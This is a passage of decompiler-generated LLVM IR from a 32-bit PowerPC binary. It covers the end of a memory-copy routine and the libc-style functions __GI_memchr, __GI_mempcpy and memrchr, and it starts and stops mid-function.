  store i32 %v1_100083d0, i32* %r4.global-to-local, align 4
  %v2_100083d4 = add i32 %v1_100083d4, -4
  %v3_100083d4 = inttoptr i32 %v2_100083d4 to i32*
  store i32 %v3_100083cc, i32* %v3_100083d4, align 4
  %v0_100083d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100083d8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083d8 = add i32 %v1_100083d8, -8
  %v3_100083d8 = inttoptr i32 %v2_100083d8 to i32*
  store i32 %v0_100083d8, i32* %v3_100083d8, align 4
  store i32 %v2_100083d8, i32* %r10.global-to-local, align 4
  %v0_100083dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100083dc = add i32 %v0_100083dc, -1
  store i32 %v1_100083dc, i32* %ctr.global-to-local, align 4
  %v2_100083dc = icmp eq i32 %v1_100083dc, 0
  br i1 %v2_100083dc, label %dec_label_pc_100083e0, label %dec_label_pc_100083cc

dec_label_pc_100083e0:                            ; preds = %dec_label_pc_100083cc, %dec_label_pc_1000842c, %dec_label_pc_100083b0
  %v0_100083e0 = load i32, i32* @r11, align 4
  %v1_100083e0 = urem i32 %v0_100083e0, 8
  store i32 %v1_100083e0, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_100083e0, 4
  br i1 %tmp, label %dec_label_pc_100083f8, label %dec_label_pc_100083ec

dec_label_pc_100083ec:                            ; preds = %dec_label_pc_100083e0
  %v0_100083ec = load i32, i32* %r4.global-to-local, align 4
  %v1_100083ec = add i32 %v0_100083ec, -4
  %v2_100083ec = inttoptr i32 %v1_100083ec to i32*
  %v3_100083ec = load i32, i32* %v2_100083ec, align 4
  store i32 %v1_100083ec, i32* %r4.global-to-local, align 4
  %v1_100083f0 = add nsw i32 %v1_100083e0, -4
  store i32 %v1_100083f0, i32* %r5.global-to-local, align 4
  %v1_100083f4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083f4 = add i32 %v1_100083f4, -4
  %v3_100083f4 = inttoptr i32 %v2_100083f4 to i32*
  store i32 %v3_100083ec, i32* %v3_100083f4, align 4
  store i32 %v2_100083f4, i32* %r10.global-to-local, align 4
  %v0_100083f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100083f8

dec_label_pc_100083f8:                            ; preds = %dec_label_pc_100083e0, %dec_label_pc_100083ec
  %v0_10008400 = phi i32 [ %v1_100083e0, %dec_label_pc_100083e0 ], [ %v0_100083f8.pre, %dec_label_pc_100083ec ]
  %v3_100083f8 = icmp eq i32 %v0_10008400, 0
  br i1 %v3_100083f8, label %dec_label_pc_10008438, label %dec_label_pc_10008400

dec_label_pc_10008400:                            ; preds = %dec_label_pc_100083f8
  store i32 %v0_10008400, i32* %ctr.global-to-local, align 4
  %v2_10008408.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008404

dec_label_pc_10008404:                            ; preds = %dec_label_pc_10008404, %dec_label_pc_10008400
  %v2_10008408 = phi i32 [ %v3_10008408, %dec_label_pc_10008404 ], [ %v2_10008408.pre, %dec_label_pc_10008400 ]
  %v0_10008404 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008404 = add i32 %v0_10008404, -1
  %v2_10008404 = inttoptr i32 %v1_10008404 to i8*
  %v3_10008404 = load i8, i8* %v2_10008404, align 1
  store i32 %v1_10008404, i32* %r4.global-to-local, align 4
  %v3_10008408 = add i32 %v2_10008408, -1
  %v4_10008408 = inttoptr i32 %v3_10008408 to i8*
  store i8 %v3_10008404, i8* %v4_10008408, align 1
  store i32 %v3_10008408, i32* %r10.global-to-local, align 4
  %v0_1000840c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000840c = add i32 %v0_1000840c, -1
  store i32 %v1_1000840c, i32* %ctr.global-to-local, align 4
  %v2_1000840c = icmp eq i32 %v1_1000840c, 0
  br i1 %v2_1000840c, label %dec_label_pc_10008438, label %dec_label_pc_10008404

dec_label_pc_10008414:                            ; preds = %dec_label_pc_100083c0
  %v1_10008414 = sub nsw i32 4, %v1_100083c0
  store i32 %v1_10008414, i32* %ctr.global-to-local, align 4
  %v2_1000841c = sub i32 %v1_100083b4, %v1_10008414
  store i32 %v2_1000841c, i32* @r11, align 4
  %v1_100084209 = add i32 %v2_100083b4, -1
  %v2_1000842010 = inttoptr i32 %v1_100084209 to i8*
  %v3_1000842011 = load i8, i8* %v2_1000842010, align 1
  store i32 %v1_100084209, i32* %r4.global-to-local, align 4
  %v3_1000842413 = add i32 %v2_100083b8, -1
  %v4_1000842414 = inttoptr i32 %v3_1000842413 to i8*
  store i8 %v3_1000842011, i8* %v4_1000842414, align 1
  store i32 %v3_1000842413, i32* %r10.global-to-local, align 4
  %v0_1000842815 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000842816 = add i32 %v0_1000842815, -1
  store i32 %v1_1000842816, i32* %ctr.global-to-local, align 4
  %v2_1000842817 = icmp eq i32 %v1_1000842816, 0
  br i1 %v2_1000842817, label %dec_label_pc_1000842c, label %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge

dec_label_pc_10008420.dec_label_pc_10008420_crit_edge: ; preds = %dec_label_pc_10008414, %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge
  %v3_1000842418 = phi i32 [ %v3_10008424, %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge ], [ %v3_1000842413, %dec_label_pc_10008414 ]
  %v0_10008420.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10008420 = add i32 %v0_10008420.pre, -1
  %v2_10008420 = inttoptr i32 %v1_10008420 to i8*
  %v3_10008420 = load i8, i8* %v2_10008420, align 1
  store i32 %v1_10008420, i32* %r4.global-to-local, align 4
  %v3_10008424 = add i32 %v3_1000842418, -1
  %v4_10008424 = inttoptr i32 %v3_10008424 to i8*
  store i8 %v3_10008420, i8* %v4_10008424, align 1
  store i32 %v3_10008424, i32* %r10.global-to-local, align 4
  %v0_10008428 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008428 = add i32 %v0_10008428, -1
  store i32 %v1_10008428, i32* %ctr.global-to-local, align 4
  %v2_10008428 = icmp eq i32 %v1_10008428, 0
  br i1 %v2_10008428, label %dec_label_pc_1000842c, label %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge

dec_label_pc_1000842c:                            ; preds = %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge, %dec_label_pc_10008414
  %v0_1000842c = load i32, i32* @r11, align 4
  %v1_1000842c = call i32 @__asm_rlwinm.(i32 %v0_1000842c, i32 29, i32 3, i32 31)
  store i32 %v1_1000842c, i32* %r9.global-to-local, align 4
  %v4_1000842c = icmp eq i32 %v1_1000842c, 0
  br i1 %v4_1000842c, label %dec_label_pc_100083e0, label %dec_label_pc_1000842c.dec_label_pc_100083c8_crit_edge

dec_label_pc_1000842c.dec_label_pc_100083c8_crit_edge: ; preds = %dec_label_pc_1000842c
  %v1_100083d4.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100083c8

dec_label_pc_10008438:                            ; preds = %dec_label_pc_10008404, %dec_label_pc_100083f8
  %v0_10008438 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10008438

; uselistorder directives
  uselistorder i32 %v1_1000842c, { 1, 2, 0 }
  uselistorder i32 %v1_10008428, { 1, 0 }
  uselistorder i32 %v3_10008424, { 1, 2, 0 }
  uselistorder i32 %v1_1000840c, { 1, 0 }
  uselistorder i32 %v3_10008408, { 1, 2, 0 }
  uselistorder i32 %v1_100083e0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100083dc, { 1, 0 }
  uselistorder i32 %v2_100083d8, { 1, 2, 0 }
  uselistorder i32 %v1_100083c0, { 1, 0 }
  uselistorder i32 %v2_100083b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100083b4, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10008420.dec_label_pc_10008420_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100083f8, { 1, 0 }
  uselistorder label %dec_label_pc_100083e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100083b0, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10008444 = urem i32 %arg1, 256
  store i32 %v1_10008444, i32* %r4.global-to-local, align 4
  %v0_100084647 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000846813 = icmp eq i32 %arg2, 0
  br i1 %v2_1000846813, label %dec_label_pc_10008470, label %dec_label_pc_1000846c

dec_label_pc_10008450:                            ; preds = %dec_label_pc_1000846c
  %v1_10008450 = inttoptr i32 %v0_10008450 to i8*
  %v2_10008450 = load i8, i8* %v1_10008450, align 1
  %v3_10008450 = zext i8 %v2_10008450 to i32
  %v0_10008454 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008454 = add i32 %v0_10008454, -1
  store i32 %v1_10008454, i32* %r5.global-to-local, align 4
  %v1_10008458 = load i32, i32* %r4.global-to-local, align 4
  %v4_10008458 = icmp eq i32 %v3_10008450, %v1_10008458
  %v0_1000845c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008458, i32 %v0_1000845c)
  %v0_10008460 = load i32, i32* @r3, align 4
  %v1_10008460 = add i32 %v0_10008460, 1
  store i32 %v1_10008460, i32* @r3, align 4
  %v0_10008468 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008468 = add i32 %v0_10008468, -1
  store i32 %v1_10008468, i32* %ctr.global-to-local, align 4
  %v2_10008468 = icmp eq i32 %v1_10008468, 0
  br i1 %v2_10008468, label %dec_label_pc_10008470.loopexit, label %dec_label_pc_1000846c

dec_label_pc_1000846c:                            ; preds = %entry, %dec_label_pc_10008450
  %v0_10008450 = phi i32 [ %v1_10008460, %dec_label_pc_10008450 ], [ %v0_100084647, %entry ]
  %v0_1000846c.in.in = phi i32 [ %v1_10008460, %dec_label_pc_10008450 ], [ %v0_100084647, %entry ]
  %v0_1000846c.in = urem i32 %v0_1000846c.in.in, 4
  %v0_1000846c = icmp eq i32 %v0_1000846c.in, 0
  br i1 %v0_1000846c, label %dec_label_pc_10008470.loopexit, label %dec_label_pc_10008450

dec_label_pc_10008470.loopexit:                   ; preds = %dec_label_pc_1000846c, %dec_label_pc_10008450
  %v0_1000849816.ph = phi i32 [ %v1_10008460, %dec_label_pc_10008450 ], [ %v0_10008450, %dec_label_pc_1000846c ]
  %v0_10008470.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10008474.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10008470

dec_label_pc_10008470:                            ; preds = %dec_label_pc_10008470.loopexit, %entry
  %v0_10008474 = phi i32 [ 0, %entry ], [ %v0_10008474.pre, %dec_label_pc_10008470.loopexit ]
  %v0_10008470 = phi i32 [ %v1_10008444, %entry ], [ %v0_10008470.pre, %dec_label_pc_10008470.loopexit ]
  %v0_1000849816 = phi i32 [ %v0_100084647, %entry ], [ %v0_1000849816.ph, %dec_label_pc_10008470.loopexit ]
  %v1_10008470 = mul i32 %v0_10008470, 256
  %v1_10008474 = udiv i32 %v0_10008474, 4
  %v2_10008478 = or i32 %v1_10008470, %v0_10008470
  %v1_10008480 = mul i32 %v2_10008478, 65536
  %v2_1000848c = or i32 %v1_10008480, %v2_10008478
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10008474, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10008474, 4
  br i1 %tmp, label %dec_label_pc_10008520, label %dec_label_pc_10008498

dec_label_pc_10008498:                            ; preds = %dec_label_pc_10008470, %dec_label_pc_1000851c.backedge
  %v0_1000851c = phi i32 [ %v1_1000851c, %dec_label_pc_1000851c.backedge ], [ %v1_10008474, %dec_label_pc_10008470 ]
  %v0_100084a0 = phi i32 [ %v1_100084a0, %dec_label_pc_1000851c.backedge ], [ %v0_10008474, %dec_label_pc_10008470 ]
  %v0_100084d8 = phi i32 [ %v1_1000849c, %dec_label_pc_1000851c.backedge ], [ %v0_1000849816, %dec_label_pc_10008470 ]
  %v1_10008498 = inttoptr i32 %v0_100084d8 to i32*
  %v2_10008498 = load i32, i32* %v1_10008498, align 4
  %v1_1000849c = add i32 %v0_100084d8, 4
  store i32 %v1_1000849c, i32* @r3, align 4
  %v1_100084a0 = add i32 %v0_100084a0, -4
  store i32 %v1_100084a0, i32* %r5.global-to-local, align 4
  %v1_100084a4 = add i32 %v0_100084d8, 1
  %v2_100084a8 = xor i32 %v2_10008498, %v2_1000848c
  %v1_100084b0 = add i32 %v2_100084a8, 2130640639
  %v2_100084b4 = xor i32 %v1_100084b0, %v2_100084a8
  %v2_100084b8 = and i32 %v2_100084b4, -2130640640
  %v6_100084b8 = icmp eq i32 %v2_100084b8, -2130640640
  br i1 %v6_100084b8, label %dec_label_pc_1000851c.backedge, label %dec_label_pc_100084c4

dec_label_pc_1000851c.backedge:                   ; preds = %dec_label_pc_10008498, %dec_label_pc_10008508
  %v1_1000851c = add i32 %v0_1000851c, -1
  store i32 %v1_1000851c, i32* %ctr.global-to-local, align 4
  %v2_1000851c = icmp eq i32 %v1_1000851c, 0
  br i1 %v2_1000851c, label %dec_label_pc_10008520, label %dec_label_pc_10008498

dec_label_pc_100084c4:                            ; preds = %dec_label_pc_10008498
  %v2_100084c4 = inttoptr i32 %v0_100084d8 to i8*
  %v3_100084c4 = load i8, i8* %v2_100084c4, align 1
  %v4_100084c4 = zext i8 %v3_100084c4 to i32
  %v1_100084c8 = add i32 %v0_100084d8, 3
  %v1_100084cc = add i32 %v0_100084d8, 2
  %v4_100084d0 = icmp eq i32 %v4_100084c4, %v0_10008470
  br i1 %v4_100084d0, label %dec_label_pc_100084d8, label %dec_label_pc_100084e0

dec_label_pc_100084d8:                            ; preds = %dec_label_pc_100084c4
  ret i32 %v0_100084d8

dec_label_pc_100084e0:                            ; preds = %dec_label_pc_100084c4
  %v2_100084e0 = inttoptr i32 %v1_100084a4 to i8*
  %v3_100084e0 = load i8, i8* %v2_100084e0, align 1
  %v4_100084e0 = zext i8 %v3_100084e0 to i32
  %v4_100084e4 = icmp eq i32 %v4_100084e0, %v0_10008470
  br i1 %v4_100084e4, label %dec_label_pc_100084ec, label %dec_label_pc_100084f4

dec_label_pc_100084ec:                            ; preds = %dec_label_pc_100084e0
  ret i32 %v1_100084a4

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084e0
  %v2_100084f4 = inttoptr i32 %v1_100084cc to i8*
  %v3_100084f4 = load i8, i8* %v2_100084f4, align 1
  %v4_100084f4 = zext i8 %v3_100084f4 to i32
  %v4_100084f8 = icmp eq i32 %v4_100084f4, %v0_10008470
  br i1 %v4_100084f8, label %dec_label_pc_10008500, label %dec_label_pc_10008508

dec_label_pc_10008500:                            ; preds = %dec_label_pc_100084f4
  ret i32 %v1_100084cc

dec_label_pc_10008508:                            ; preds = %dec_label_pc_100084f4
  %v2_10008508 = inttoptr i32 %v1_100084c8 to i8*
  %v3_10008508 = load i8, i8* %v2_10008508, align 1
  %v4_10008508 = zext i8 %v3_10008508 to i32
  %v4_1000850c = icmp eq i32 %v4_10008508, %v0_10008470
  br i1 %v4_1000850c, label %dec_label_pc_10008514, label %dec_label_pc_1000851c.backedge

dec_label_pc_10008514:                            ; preds = %dec_label_pc_10008508
  ret i32 %v1_100084c8

dec_label_pc_10008520:                            ; preds = %dec_label_pc_1000851c.backedge, %dec_label_pc_10008470
  %v0_1000852c26 = phi i32 [ %v0_1000849816, %dec_label_pc_10008470 ], [ %v1_1000849c, %dec_label_pc_1000851c.backedge ]
  %v0_10008520 = phi i32 [ %v0_10008474, %dec_label_pc_10008470 ], [ %v1_100084a0, %dec_label_pc_1000851c.backedge ]
  %v1_10008520 = add i32 %v0_10008520, 1
  store i32 %v1_10008520, i32* %r5.global-to-local, align 4
  store i32 %v0_10008520, i32* %ctr.global-to-local, align 4
  %v2_1000853c3 = icmp eq i32 %v0_10008520, 0
  br i1 %v2_1000853c3, label %dec_label_pc_10008540, label %dec_label_pc_1000852c

dec_label_pc_1000852c:                            ; preds = %dec_label_pc_10008520, %dec_label_pc_1000852c.dec_label_pc_1000852c_crit_edge
  %v1_10008530 = phi i32 [ %v1_10008530.pre, %dec_label_pc_1000852c.dec_label_pc_1000852c_crit_edge ], [ %v0_10008470, %dec_label_pc_10008520 ]
  %v0_1000852c = phi i32 [ %v1_10008538, %dec_label_pc_1000852c.dec_label_pc_1000852c_crit_edge ], [ %v0_1000852c26, %dec_label_pc_10008520 ]
  %v1_1000852c = inttoptr i32 %v0_1000852c to i8*
  %v2_1000852c = load i8, i8* %v1_1000852c, align 1
  %v3_1000852c = zext i8 %v2_1000852c to i32
  %v4_10008530 = icmp eq i32 %v3_1000852c, %v1_10008530
  %v0_10008534 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008530, i32 %v0_10008534)
  %v0_10008538 = load i32, i32* @r3, align 4
  %v1_10008538 = add i32 %v0_10008538, 1
  store i32 %v1_10008538, i32* @r3, align 4
  %v0_1000853c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000853c = add i32 %v0_1000853c, -1
  store i32 %v1_1000853c, i32* %ctr.global-to-local, align 4
  %v2_1000853c = icmp eq i32 %v1_1000853c, 0
  br i1 %v2_1000853c, label %dec_label_pc_10008540, label %dec_label_pc_1000852c.dec_label_pc_1000852c_crit_edge

dec_label_pc_1000852c.dec_label_pc_1000852c_crit_edge: ; preds = %dec_label_pc_1000852c
  %v1_10008530.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000852c

dec_label_pc_10008540:                            ; preds = %dec_label_pc_1000852c, %dec_label_pc_10008520
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000853c, { 1, 0 }
  uselistorder i32 %v1_10008538, { 1, 0 }
  uselistorder i32 %v0_10008520, { 1, 2, 0 }
  uselistorder i32 %v1_1000851c, { 2, 1, 0 }
  uselistorder i32 %v1_100084a0, { 0, 2, 1 }
  uselistorder i32 %v1_1000849c, { 0, 2, 1 }
  uselistorder i32 %v0_100084d8, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10008478, { 1, 0 }
  uselistorder i32 %v1_10008474, { 1, 0 }
  uselistorder i32 %v0_1000849816, { 1, 0 }
  uselistorder i32 %v0_10008470, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10008474, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10008468, { 1, 0 }
  uselistorder i32 %v1_10008460, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100084647, { 2, 0, 1 }
  uselistorder i32 %v1_10008444, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 5, 0, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000852c, { 1, 0 }
  uselistorder label %dec_label_pc_1000851c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10008498, { 1, 0 }
  uselistorder label %dec_label_pc_1000846c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268469604, i32* @lr, align 4
  %v0_10008560 = call i32 @memcpy()
  %v0_10008568 = load i32, i32* @r28, align 4
  %v1_10008568 = load i32, i32* @r29, align 4
  %v2_10008568 = add i32 %v1_10008568, %v0_10008568
  ret i32 %v2_10008568
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10008580 = urem i32 %arg2, 256
  store i32 %v1_10008580, i32* %r4.global-to-local, align 4
  %v2_10008588 = add i32 %arg3, %arg1
  store i32 %v2_10008588, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_100085a413 = icmp eq i32 %arg3, 0
  br i1 %v2_100085a413, label %dec_label_pc_100085ac, label %dec_label_pc_100085a8

dec_label_pc_10008590:                            ; preds = %dec_label_pc_100085a8
  %v1_10008590 = add i32 %v0_10008590, -1
  %v2_10008590 = inttoptr i32 %v1_10008590 to i8*
  %v3_10008590 = load i8, i8* %v2_10008590, align 1
  %v4_10008590 = zext i8 %v3_10008590 to i32
  store i32 %v1_10008590, i32* %r3.global-to-local, align 4
  %v0_10008594 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008594 = add i32 %v0_10008594, -1
  store i32 %v1_10008594, i32* %r5.global-to-local, align 4
  %v1_10008598 = load i32, i32* %r4.global-to-local, align 4
  %v4_10008598 = icmp eq i32 %v4_10008590, %v1_10008598
  %v0_1000859c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008598, i32 %v0_1000859c)
  %v0_100085a0 = load i32, i32* %r3.global-to-local, align 4
  %v0_100085a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100085a4 = add i32 %v0_100085a4, -1
  store i32 %v1_100085a4, i32* %ctr.global-to-local, align 4
  %v2_100085a4 = icmp eq i32 %v1_100085a4, 0
  br i1 %v2_100085a4, label %dec_label_pc_100085ac.loopexit, label %dec_label_pc_100085a8

dec_label_pc_100085a8:                            ; preds = %entry, %dec_label_pc_10008590
  %v0_10008590 = phi i32 [ %v0_100085a0, %dec_label_pc_10008590 ], [ %v2_10008588, %entry ]
  %v0_100085a8.in.in = phi i32 [ %v0_100085a0, %dec_label_pc_10008590 ], [ %v2_10008588, %entry ]
  %v0_100085a8.in = urem i32 %v0_100085a8.in.in, 4
  %v0_100085a8 = icmp eq i32 %v0_100085a8.in, 0
  br i1 %v0_100085a8, label %dec_label_pc_100085ac.loopexit, label %dec_label_pc_10008590

dec_label_pc_100085ac.loopexit:                   ; preds = %dec_label_pc_100085a8, %dec_label_pc_10008590
  %v0_100085d416.ph = phi i32 [ %v0_100085a0, %dec_label_pc_10008590 ], [ %v0_10008590, %dec_label_pc_100085a8 ]
  %v0_100085ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_100085b0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100085ac

dec_label_pc_100085ac:                            ; preds = %dec_label_pc_100085ac.loopexit, %entry
  %v0_100085b0 = phi i32 [ 0, %entry ], [ %v0_100085b0.pre, %dec_label_pc_100085ac.loopexit ]
  %v0_100085ac = phi i32 [ %v1_10008580, %entry ], [ %v0_100085ac.pre, %dec_label_pc_100085ac.loopexit ]
  %v0_100085d416 = phi i32 [ %v2_10008588, %entry ], [ %v0_100085d416.ph, %dec_label_pc_100085ac.loopexit ]
  %v1_100085ac = mul i32 %v0_100085ac, 256
  %v1_100085b0 = udiv i32 %v0_100085b0, 4
  %v2_100085b4 = or i32 %v1_100085ac, %v0_100085ac
  %v1_100085bc = mul i32 %v2_100085b4, 65536
  %v2_100085c8 = or i32 %v1_100085bc, %v2_100085b4
  store i32 %v2_100085c8, i32* @r7, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_100085b0, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_100085b0, 4
  br i1 %tmp, label %dec_label_pc_1000864c, label %dec_label_pc_100085d4

dec_label_pc_100085d4:                            ; preds = %dec_label_pc_100085ac, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge
  %v0_1000864821 = phi i32 [ %v1_10008648, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge ], [ %v1_100085b0, %dec_label_pc_100085ac ]
  %v0_100085f4 = phi i32 [ %v0_100085f4.pre, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge ], [ -2130640640, %dec_label_pc_100085ac ]
  %v0_100085dc = phi i32 [ %v0_100085dc.pre, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge ], [ %v2_100085c8, %dec_label_pc_100085ac ]
  %v0_100085d8 = phi i32 [ %v0_100085d8.pre, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge ], [ %v0_100085b0, %dec_label_pc_100085ac ]
  %v0_100085d4 = phi i32 [ %v0_100085d4.pre, %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge ], [ %v0_100085d416, %dec_label_pc_100085ac ]
  %v1_100085d4 = add i32 %v0_100085d4, -4
  %v2_100085d4 = inttoptr i32 %v1_100085d4 to i32*
  %v3_100085d4 = load i32, i32* %v2_100085d4, align 4
  store i32 %v1_100085d4, i32* %r3.global-to-local, align 4
  %v1_100085d8 = add i32 %v0_100085d8, -4
  store i32 %v1_100085d8, i32* %r5.global-to-local, align 4
  %v2_100085dc = xor i32 %v3_100085d4, %v0_100085dc
  %v1_100085e0 = add i32 %v0_100085d4, -3
  %v1_100085e8 = add i32 %v2_100085dc, 2130640639
  %v1_100085f0 = add i32 %v0_100085d4, -2
  %v2_100085ec = sub i32 -1, %v2_100085dc
  %v2_100085f4 = xor i32 %v1_100085e8, %v2_100085ec
  %v3_100085f4 = and i32 %v2_100085f4, %v0_100085f4
  %v6_100085f4 = icmp eq i32 %v3_100085f4, 0
  %v1_100085f8 = add i32 %v0_100085d4, -1
  br i1 %v6_100085f4, label %dec_label_pc_10008648.backedge, label %dec_label_pc_10008600

dec_label_pc_10008600:                            ; preds = %dec_label_pc_100085d4
  %v2_10008600 = inttoptr i32 %v1_100085f8 to i8*
  %v3_10008600 = load i8, i8* %v2_10008600, align 1
  %v4_10008600 = zext i8 %v3_10008600 to i32
  %v1_10008604 = load i32, i32* %r4.global-to-local, align 4
  %v4_10008604 = icmp eq i32 %v4_10008600, %v1_10008604
  br i1 %v4_10008604, label %dec_label_pc_1000860c, label %dec_label_pc_10008614

dec_label_pc_1000860c:                            ; preds = %dec_label_pc_10008600
  store i32 %v1_100085f8, i32* %r3.global-to-local, align 4
  ret i32 %v1_100085f8

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008600
  %v2_10008614 = inttoptr i32 %v1_100085f0 to i8*
  %v3_10008614 = load i8, i8* %v2_10008614, align 1
  %v4_10008614 = zext i8 %v3_10008614 to i32
  %v4_10008618 = icmp eq i32 %v4_10008614, %v1_10008604
  br i1 %v4_10008618, label %dec_label_pc_10008620, label %dec_label_pc_10008628

dec_label_pc_10008620:                            ; preds = %dec_label_pc_10008614
  store i32 %v1_100085f0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100085f0

dec_label_pc_10008628:                            ; preds = %dec_label_pc_10008614
  %v2_10008628 = inttoptr i32 %v1_100085e0 to i8*
  %v3_10008628 = load i8, i8* %v2_10008628, align 1
  %v4_10008628 = zext i8 %v3_10008628 to i32
  %v4_1000862c = icmp eq i32 %v4_10008628, %v1_10008604
  br i1 %v4_1000862c, label %dec_label_pc_10008634, label %dec_label_pc_1000863c

dec_label_pc_10008634:                            ; preds = %dec_label_pc_10008628
  store i32 %v1_100085e0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100085e0

dec_label_pc_1000863c:                            ; preds = %dec_label_pc_10008628
  %v1_1000863c = inttoptr i32 %v1_100085d4 to i8*
  %v2_1000863c = load i8, i8* %v1_1000863c, align 1
  %v3_1000863c = zext i8 %v2_1000863c to i32
  %v4_10008640 = icmp eq i32 %v3_1000863c, %v1_10008604
  %v0_10008644 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008640, i32 %v0_10008644)
  %v0_10008648.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008648.backedge

dec_label_pc_10008648.backedge:                   ; preds = %dec_label_pc_1000863c, %dec_label_pc_100085d4
  %v0_10008648 = phi i32 [ %v0_10008648.pre, %dec_label_pc_1000863c ], [ %v0_1000864821, %dec_label_pc_100085d4 ]
  %v1_10008648 = add i32 %v0_10008648, -1
  store i32 %v1_10008648, i32* %ctr.global-to-local, align 4
  %v2_10008648 = icmp eq i32 %v1_10008648, 0
  br i1 %v2_10008648, label %dec_label_pc_10008648.dec_label_pc_1000864c_crit_edge, label %dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge

dec_label_pc_10008648.backedge.dec_label_pc_100085d4_crit_edge: ; preds = %dec_label_pc_10008648.backedge
  %v0_100085d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100085d8.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100085dc.pre = load i32, i32* @r7, align 4
